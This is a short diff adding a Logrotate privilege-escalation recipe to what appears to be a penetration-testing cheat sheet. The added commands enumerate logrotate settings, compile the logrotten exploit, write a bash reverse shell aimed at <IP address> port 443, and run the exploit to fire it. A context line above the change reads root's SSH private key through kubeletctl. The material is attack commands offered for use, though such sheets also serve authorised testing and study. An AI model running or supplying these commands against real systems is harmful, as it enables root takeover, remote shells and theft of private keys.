@@ -2035,6 +2035,20 @@ $ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP add
 $ kubeletctl --server <IP address> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
 ```
 
+- Logrotate
+
+```
+$ cat /etc/logrotate.conf
+$ sudo cat /var/lib/logrotate.status
+$ ls /etc/logrotate.d/
+$ cat /etc/logrotate.d/dpkg
+https://github.com/whotwagner/logrotten
+$ gcc logrotten.c -o logrotten
+$ echo 'bash -i >& /dev/tcp/<IP address>/443 0>&1' > payload
+$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+$ ./logrotten -p ./payload /tmp/tmp.log
+```
+
 - Disk Group
 
 ```
